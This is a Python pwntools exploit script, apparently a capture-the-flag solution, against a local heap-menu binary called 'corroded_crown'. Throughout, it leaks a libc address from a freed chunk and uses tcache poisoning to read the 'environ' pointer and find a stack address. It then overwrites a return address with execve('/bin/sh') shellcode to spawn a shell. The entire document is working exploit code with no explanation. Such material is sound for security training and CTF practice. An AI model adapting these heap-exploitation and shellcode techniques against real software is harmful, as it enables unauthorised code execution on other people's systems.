from pwn import *

p=process("./corroded_crown")
libc = ELF('glibc/libc.so.6')
context.arch = 'amd64'


def forge(index, size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"(index): ", str(index).encode())
    p.sendlineafter(b"(size): ", str(size).encode())

def inscribe(index, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"(index): ", str(index).encode())
    p.send(data)

def inspect(index):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"(index): ", str(index).encode())
    p.recvuntil(b"]: ")
    return p.recv(8)

def destroy(index):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"(index): ", str(index).encode())


# libc leak
forge(2,1056)
forge(3,32) # to prevent top chunk from absorbing the first chunk deallocated
destroy(2)
leak = u64(inspect(2).ljust(8,b'\x00'))
log.info(f"libc leak: {hex(leak)}")

# libc base
lbc_offset = 0x7ffff7fbfbe0 - 0x00007ffff7dd3000 # static values of libc leak - libc base
libc_base = leak - lbc_offset
log.info(f"libc base: {hex(libc_base)}")
environ_addr = libc_base + libc.symbols['environ']

# stack leak
forge(4,16)
forge(5,16)
destroy(4)
destroy(5)
inscribe(5,p64(environ_addr))
forge(6,16)
forge(7,16)
stack_leak = u64(inspect(7).ljust(8,b"\x00"))
log.info(f"stack leak: {hex(stack_leak)}")

# writing shellcode
shellcode = """ 
   mov rax, 0x3b 
   xor rsi, rsi 
   xor rdx, rdx 
   lea rdi, [rip + binsh] 
   syscall 
   binsh: 
   .ascii "/bin/sh" 
   .byte 0x0 
   """ 
payload=asm(shellcode)

# return address
stack_offset = 0x00007fffffffd578 - 0x7fffffffd538 # static values of environ - return address of inscribe_relic
ret_addr = stack_leak - stack_offset
log.info(f"return address {hex(ret_addr)}")

# chunk pointing to retrun address
forge(12,48)
forge(13,48)
destroy(12)
destroy(13)
inscribe(13,p64(ret_addr))

# writing shellcode on return address
forge(14,48)
forge(15,48)
inscribe(15,p64(ret_addr+8)+payload)
p.interactive()
